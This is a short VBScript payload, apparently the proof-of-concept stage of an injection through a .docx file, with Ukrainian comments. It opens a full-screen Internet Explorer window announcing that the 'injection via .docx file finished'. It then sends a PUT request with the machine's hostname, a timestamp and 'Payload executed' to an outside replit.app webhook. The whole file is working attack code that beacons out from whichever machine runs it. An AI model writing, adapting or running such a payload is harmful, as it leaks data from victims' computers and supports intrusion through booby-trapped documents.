Set objShell = CreateObject("WScript.Shell")
Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' --- Повноекранне вікно ---
Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "about:blank"
ie.ToolBar = 0
ie.StatusBar = 0
ie.FullScreen = True
ie.Document.Write "<html><body bgcolor='black' style='margin:0;overflow:hidden;'>" & _
    "<div style='display:flex;align-items:center;justify-content:center;height:100vh;'>" & _
    "<p style='color:red;font-size:72px;font-family:Courier New;text-align:center;'>" & _
    "All is working. Injection via .docx file finished</p></div></body></html>"
ie.Visible = True
objShell.AppActivate "Internet Explorer"

WScript.Sleep 10000   ' 10 секунд показати
ie.Quit

' --- PUT-запит ---
url = "https://eset-bot-sender--0xw1zard.replit.app/api/eset-webhook"
jsonPayload = "{""text"":""Payload executed"",""timestamp"":""" & Now() & """,""hostname"":""" & objShell.ExpandEnvironmentStrings("%COMPUTERNAME%") & """}"
objHTTP.Open "PUT", url, False
objHTTP.setRequestHeader "Content-Type", "application/json"
objHTTP.Send jsonPayload
